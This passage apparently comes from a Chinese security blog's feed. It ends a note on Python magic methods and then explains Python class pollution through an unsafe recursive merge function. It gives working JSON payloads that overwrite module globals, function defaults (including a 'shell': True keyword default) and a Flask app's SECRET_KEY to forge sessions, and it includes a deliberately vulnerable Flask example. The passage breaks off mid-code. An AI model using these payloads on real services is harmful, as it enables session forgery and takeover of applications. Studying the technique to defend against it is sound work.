**kwargs):</span><br><span class="line">        instance = super().__new__(cls)</span><br><span class="line">        return instance</span><br></pre></td></tr></table></figure></li><li><p>**<code>__reduce__</code>**：用于定义对象序列化的行为，返回一个元组来帮助对象序列化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure></li><li><p>**<code>__reduce_ex__</code>**：与 <code>__reduce__</code> 类似，但可以支持更多的协议版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce_ex__(self, protocol):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure></li><li><p>**<code>__repr__</code>**：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure></li><li><p>**<code>__setattr__</code>**：当试图设置对象的属性时调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        print(f&quot;Setting attribute &#123;name&#125; to &#123;value&#125;&quot;)</span><br><span class="line">        super().__setattr__(name, value)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__sizeof__</code>**：返回对象占用的内存大小，通常由 <code>sys.getsizeof()</code> 调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __sizeof__(self):</span><br><span class="line">        return object.__sizeof__(self) + sum(sys.getsizeof(v) for v in self.__dict__.values</span><br></pre></td></tr></table></figure></li><li><p>**<code>__subclasshook__</code>**：自定义类的子类检测逻辑。通常由 <code>issubclass()</code> 调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    @classmethod</span><br><span class="line">    def __subclasshook__(cls, subclass):</span><br><span class="line">        return hasattr(subclass, &#x27;custom_method&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>**<code>__weakref__</code>**：用于支持弱引用，如果类中没有 <code>__slots__</code> 属性，则对象的弱引用字典会自动包含此属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import weakref</span><br><span class="line"></span><br><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">obj = Example()</span><br><span class="line">r = weakref.ref(obj)</span><br><span class="line">print(r)  # &lt;weakref at 0x...; to &#x27;Example&#x27; at 0x...&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><p><code>__doc__</code>:查看默认类的帮助</p><p><code>dir()</code>查看类的所有<code>属性</code>和<code>方法</code></p><p><code>chr</code>,<code>ord</code>ASCII码和字符的转换。</p><p><code>globals</code>:返回全局变量的函数</p><p><code>locals</code>:返回所有局部变量</p><p><code>__import__</code>:import os 等价于 os &#x3D; __import__(‘os’)</p><p><code>__file__</code>:当前运行代码所在路径</p><p><code>_</code>:该变量返回上一次运行的python语句结果，但仅仅会在运行<code>交互式终端</code>时产生，运行代码文件是不会有此变量。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/2024/02/26/py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/02/26/py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>python原型链污染和js的差不多，后者是通过键值对的方式来<code>控制object的prototype的属性</code>和<code>方法</code>，而前者则是是能污染<code>类的属性</code></p><p>这里对应的merge函数就是python中对属性值控制的一个操作，将源参数赋值到目标参数。</p><p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值。</p><p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = <span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Usr1</span>(<span class="title class_ inherited__">Admin</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Usr2</span>(<span class="title class_ inherited__">Admin</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">ins = Usr2()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;no_root&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"><span class="built_in">print</span>(ins.<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"></span><br><span class="line">merge(payload, ins)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果，只有 ins 的 id 受影响</span></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>)  <span class="comment"># 输出: root</span></span><br><span class="line"><span class="built_in">print</span>(ins.<span class="built_in">id</span>)  <span class="comment"># 输出: no_root</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意，这里要是直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Admin</span>();</span><br><span class="line"><span class="built_in">id</span> = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    </span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(Usr1().<span class="built_in">id</span>) <span class="comment"># no_root</span></span><br></pre></td></tr></table></figure><blockquote><p>注意我们可以污染实例，但是没办法污染对象 object</p><p>比如 merge(payload, usr1)会报错</p></blockquote><h2 id="一些类的知识"><a href="#一些类的知识" class="headerlink" title="一些类的知识"></a>一些类的知识</h2><p>详情可以去看pyjail里面的属性</p><h2 id="获取目标类："><a href="#获取目标类：" class="headerlink" title="获取目标类："></a>获取目标类：</h2><p>上面示例我们是通过<code>__base__</code>属性查找到继承的父类，然后污染到的父类中的secret参数，但是如果目标类与切入点没有父子类继承关系，那我们就无法用<code>__base__</code>属性来进行对目标类的获取和污染</p><h2 id="获取全局变量："><a href="#获取全局变量：" class="headerlink" title="获取全局变量："></a>获取全局变量：</h2><p>在函数或类方法中，我们经常会看到<code>__init__</code>初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数<code>所在模块</code>的全局命名空间。具体来说就是，<code>__globals__</code> 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">secrets = <span class="string">&#x27;9dufh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gettttt</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gettttt.__globals__ == <span class="built_in">globals</span>() == NO.__init__.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True</span></span><br></pre></td></tr></table></figure><p>在 Python 中，函数名本身（例如 <code>gettttt</code>）表示的是一个函数对象。只有在加上括号 <code>()</code> 时，才会调用这个函数。</p><p>因此，当你写 <code>gettttt.__globals__</code> 时，你是在访问 <code>gettttt</code> 函数对象的 <code>__globals__</code> 属性，而不是调用 <code>gettttt</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> doctest <span class="keyword">import</span> script_from_examples</span><br><span class="line"></span><br><span class="line">secrets = <span class="string">&#x27;9dufh&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gettttt</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NO_secret</span>:</span><br><span class="line">    no = <span class="string">&#x27;no_secret&#x27;</span></span><br><span class="line"><span class="comment"># print(gettttt.__globals__ == globals() == NO.__init__.__globals__)</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">ins = NO()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secrets&quot;</span> : <span class="string">&#x27;I got it!!1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;NO_secret&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;no&quot;</span> : <span class="string">&quot;dont say no!!&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(NO_secret.no)</span><br><span class="line"><span class="built_in">print</span>(secrets)</span><br><span class="line"></span><br><span class="line">merge(payload, ins)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(NO_secret.no)</span><br><span class="line"><span class="built_in">print</span>(secrets)</span><br></pre></td></tr></table></figure><h4 id="import加载获取："><a href="#import加载获取：" class="headerlink" title="import加载获取："></a>import加载获取：</h4><p>在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import demo</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;demo&quot;:&#123;</span><br><span class="line">                &quot;a&quot;:4,</span><br><span class="line">                &quot;B&quot;:&#123;</span><br><span class="line">                    &quot;classa&quot;:5</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">##demo.py</span><br><span class="line">a = 1</span><br><span class="line">class B:</span><br><span class="line">    classa = 2</span><br></pre></td></tr></table></figure><h4 id="sys模块加载获取："><a href="#sys模块加载获取：" class="headerlink" title="sys模块加载获取："></a>sys模块加载获取：</h4><p>在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：</p><p>同样是刚才的情景，因为我们已经加载过demo.py了，所以我们用sys来对里面的目标进行获取,但是存在一个问题就是，我们的payload传参的时候大概率是在它源码已有的基础上进行传参，很有可能源码中没有引入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;demo&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;a&quot;</span>:<span class="number">4</span>,</span><br><span class="line">                        <span class="string">&quot;B&quot;</span>:&#123;</span><br><span class="line">                            <span class="string">&quot;classa&quot;</span>:<span class="number">5</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="加载器loader获取："><a href="#加载器loader获取：" class="headerlink" title="加载器loader获取："></a>加载器loader获取：</h4><p>loader加载器在python中的作用是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__[&#39;sys&#39;]</code>来获取到sys模块，然后再获取到我们想要的模块。</p><p>那么我们现在的目标就变成了获取loader：</p><p>在Python中，<code>__loader__</code>是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过<code>__loader__</code>属性，我们可以获取到加载特定模块的loader对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 获取模块的loader</span></span><br><span class="line">loader = math.__loader__</span><br><span class="line"><span class="comment"># 打印loader信息</span></span><br><span class="line"><span class="built_in">print</span>(loader)</span><br></pre></td></tr></table></figure><p>在这个例子当中我们就能够明白，math模块的<code>__loader__</code>属性包含了一个loader对象，负责加载math模块</p><p>在python中还存在一个<code>__spec__</code>，包含了关于类加载时候的信息，他定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>获取到<code>sys</code>模块</p><h2 id="函数形参默认值替换："><a href="#函数形参默认值替换：" class="headerlink" title="函数形参默认值替换："></a>函数形参默认值替换：</h2><p>在Python中，<code>__defaults__</code>是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在<code>__defaults__</code>元组中。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br></pre></td></tr></table></figure><p>所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：&#96;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (<span class="literal">True</span>,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__kwdefaults__</code>是以字典形式来进行收录：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;demo&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键信息替换："><a href="#关键信息替换：" class="headerlink" title="关键信息替换："></a>关键信息替换：</h2><h3 id="flask密钥替换："><a href="#flask密钥替换：" class="headerlink" title="flask密钥替换："></a>flask密钥替换：</h3><p>如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过<code>__init__.__globals__</code>获取全局变量，然后通过app.config[“SECRET_KEY”]来进行污染：下面用一下师傅的示范的板子</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里我们并无法确定secretkey是什么，所以如果能够污染我们就可以实现任意的session伪造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="got-first-request："><a href="#got-first-request：" class="headerlink" title="_got_first_request："></a>_got_first_request：</h3><p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p><p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span 